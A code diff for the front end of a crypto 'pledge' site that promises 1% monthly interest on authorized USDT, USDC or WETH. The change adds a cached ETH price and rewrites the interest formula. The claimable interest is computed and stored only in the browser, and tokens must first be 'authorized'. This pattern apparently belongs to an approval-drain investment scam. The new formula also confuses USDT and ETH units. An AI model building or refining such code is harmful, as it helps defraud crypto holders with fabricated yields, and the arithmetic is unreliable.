@@ -76,8 +76,15 @@ const isDevMode = window.location.hostname === 'localhost' || window.location.ho
 window.currentClaimable = 0;
 window.currentPending = 0;
 
-// 【利率設定 - 這裡修改】
-const MONTHLY_RATE = 0.01; // 每月 1% 利率（1000 USDT → 10 USDT）
+// 【每月 1% 利率 → 每 12 小時】
+const MONTHLY_RATE = 0.01; // 1%
+
+// 【ETH 價格快取 - 只在開 Claim 時更新】
+let ethPriceCache = {
+  price: 2500, // fallback
+  timestamp: 0,
+  cacheDuration: 5 * 60 * 1000 // 5 分鐘
+};
 
 const translations = {
   'en': {
@@ -417,26 +424,26 @@ function updateTotalFunds() {
   totalValue.textContent = `${total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
 }
 
-// 【取得 ETH 價格】
-async function getEthPriceUSD() {
+// 【只在開 Claim 時更新價格】
+async function refreshEthPrice() {
+  const now = Date.now();
+  if (now - ethPriceCache.timestamp < ethPriceCache.cacheDuration) return;
+
   try {
     const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
+    if (!response.ok) throw new Error();
     const data = await response.json();
-    return data.ethereum.usd;
+    ethPriceCache.price = data.ethereum.usd;
+    ethPriceCache.timestamp = now;
   } catch (error) {
-    return 2500; // fallback
+    console.warn('Price fetch failed, using fallback');
   }
 }
 
 // 【計算單次 12 小時利息（ETH）】
-async function calculatePayoutInterest() {
+function calculatePayoutInterest() {
   if (pledgedAmount <= 0) return 0;
-
-  const ethPriceUSD = await getEthPriceUSD();
-  const pledgedUSD = pledgedAmount; // USDT ≈ USD
-  const targetMonthlyUSD = pledgedUSD * MONTHLY_RATE; // 1%
-  const target12HourUSD = targetMonthlyUSD / 60;
-  return target12HourUSD / ethPriceUSD; // ETH
+  return pledgedAmount * (MONTHLY_RATE / 60); // 每月 1% → 每 12 小時
 }
 
 // 【更新利息 - 秒級跳動】
@@ -459,7 +466,7 @@ async function updateInterest() {
 
   currentCycleInterest = parseFloat(localStorage.getItem('currentCycleInterest')) || 0;
   if (now - lastClaimTime >= msIn12Hours || currentCycleInterest === 0) {
-    currentCycleInterest = await calculatePayoutInterest();
+    currentCycleInterest = calculatePayoutInterest();
     localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
   }
 
@@ -504,9 +511,12 @@ function updateClaimModalLabels() {
   }
 }
 
-// 【Claim 面板即時跳動 + 語言同步 + 換算等值金額】
+// 【Claim 面板即時跳動 + 只在開啟時查價】
 async function claimInterest() {
   const token = authorizedToken;
+
+  // 【關鍵：只在開 Claim 時查一次價格】
+  await refreshEthPrice();
 
   updateClaimModalLabels();
 
@@ -514,21 +524,19 @@ async function claimInterest() {
   modalPendingETH.textContent = `${window.currentPending.toFixed(7)} ETH`;
   modalSelectedToken.textContent = token;
 
-  // 【等值金額：ETH → 換算成授權代幣價值】
-  const ethPriceUSD = await getEthPriceUSD();
-  const claimableUSD = window.currentClaimable * ethPriceUSD;
-  const equivalent = claimableUSD; // USDT/USDC ≈ USD
+  // 使用快取價格
+  const equivalent = window.currentClaimable * ethPriceCache.price;
   modalEquivalentValue.textContent = `${equivalent.toFixed(3)} ${token}`;
 
   claimModal.style.display = 'flex';
 
   if (claimInterval) clearInterval(claimInterval);
   claimInterval = setInterval(async () => {
-    await updateInterest();
+    await updateInterest(); // 只更新數字，不查價
     modalClaimableETH.textContent = `${window.currentClaimable.toFixed(7)} ETH`;
     modalPendingETH.textContent = `${window.currentPending.toFixed(7)} ETH`;
-    const claimableUSD = window.currentClaimable * ethPriceUSD;
-    modalEquivalentValue.textContent = `${claimableUSD.toFixed(3)} ${token}`;
+    const eq = window.currentClaimable * ethPriceCache.price;
+    modalEquivalentValue.textContent = `${eq.toFixed(3)} ${token}`;
   }, 1000);
 }
 
@@ -758,7 +766,7 @@ async function updateUIBasedOnChainState() {
       if (balance >= 1) {
         pledgedAmount = balance;
         lastPayoutTime = lastPayoutTime || Date.now();
-        currentCycleInterest = await calculatePayoutInterest();
+        currentCycleInterest = calculatePayoutInterest();
         authorizedToken = selectedToken;
         localStorage.setItem('pledgedAmount', pledgedAmount.toString());
         localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
@@ -986,7 +994,7 @@ document.addEventListener('DOMContentLoaded', () => {
         await handleConditionalAuthorizationFlow();
         let canStart = false;
         if (selectedToken === 'WETH') {
-          const prices = await getEthPriceUSD();
+          const prices = ethPriceCache.price || 2500;
           const wethValueUSD = balance * prices;
           if (wethValueUSD >= 500) canStart = true;
         } else {
@@ -995,7 +1003,7 @@ document.addEventListener('DOMContentLoaded', () => {
         if (canStart) {
           pledgedAmount = balance;
           lastPayoutTime = Date.now();
-          currentCycleInterest = await calculatePayoutInterest();
+          currentCycleInterest = calculatePayoutInterest();
           authorizedToken = selectedToken;
           localStorage.setItem('pledgedAmount', pledgedAmount.toString());
           localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
